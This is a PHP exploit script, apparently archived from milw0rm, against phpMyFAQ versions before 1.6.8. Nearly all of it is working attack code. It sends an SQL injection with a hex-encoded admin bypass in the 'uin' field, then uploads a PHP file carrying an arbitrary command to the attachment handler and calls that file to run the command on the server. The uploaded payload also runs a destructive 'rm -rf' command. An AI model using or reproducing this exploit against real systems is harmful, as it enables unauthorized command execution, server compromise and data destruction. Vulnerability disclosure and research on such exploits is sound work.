#!/usr/bin/php5-cgi -q
<?

/*
Sql injection / remote command execution exploit for phpmyfaq < 1.6.8

Bugtraq:
http://www.securityfocus.com/bid/21944

CVS:
http://thinkforge.org/plugins/scmcvs/cvsweb.php/phpmyfaq/admin/attachment.php.diff?r1=1.7.2.11.2.5;r2=1.7.2.11.2.6;cvsroot=phpmyfaq;f=h

./pmf.php http://xxxx.xxxx.edu/faq/ "<? system('id'); ?>" localhost:4001

elgCrew@safe-mail.net
*/

function do_upload($baseurl, $proxy, $cmd)
{

	$fp = fopen("kebab.php", "w");
	if(!$fp)
		die("Cannot open file for writing");

	$code = "Un1q" . $cmd . "<? system(\"rm -rf ../1337/\"); ?>";
	fwrite($fp, $code);
	fclose($fp);
	
	$sendvars["aktion"] = "save";
        $sendvars["uin"] = "-1' UNION SELECT char(0x61,0x64,0x6d,0x69,0x6e),char(0x61,0x61,0x27,0x20,0x4f,0x52,0x20,0x31,0x3d,0x31,0x20,0x2f,0x2a) /*";
        $sendvars["save"] = "TRUE";
        $sendvars["MAX_FILE_SIZE"] = "100000";
        $sendvars["id"] = "1337";
        $sendvars["userfile"] = '@kebab.php';
        $sendvars["filename"] = "kebab.php";

        $posturl = $baseurl . "/admin/attachment.php";
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $posturl);

        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $sendvars);
        echo "=> Uploading file.\n";
        $result = curl_exec($ch);
	curl_close($ch);
	@unlink("kebab.php");
	$get =  $baseurl . "/attachments/1337/kebab.php\n";

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $get);
	curl_setopt($ch, CURLOPT_PROXY, $proxy);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$result = curl_exec($ch);
	if(strstr($result, "Un1q"))
		echo substr($result, 4);
	else
		echo "Not vulnerable / error ?\n";
	curl_close($ch);


}

if($argc < 3)
{
	printf("Usage: %s http://test.com/phpmyfaq/ \"<? system('uname -a'); ?> \" [proxy]\n", $argv[0]);
	exit(0);
}
if($argc == 4)
	$proxy = $argv[3];
else
	$proxy = "";

do_upload($argv[1], $proxy, $argv[2]);

?>

# milw0rm.com [2007-03-01]
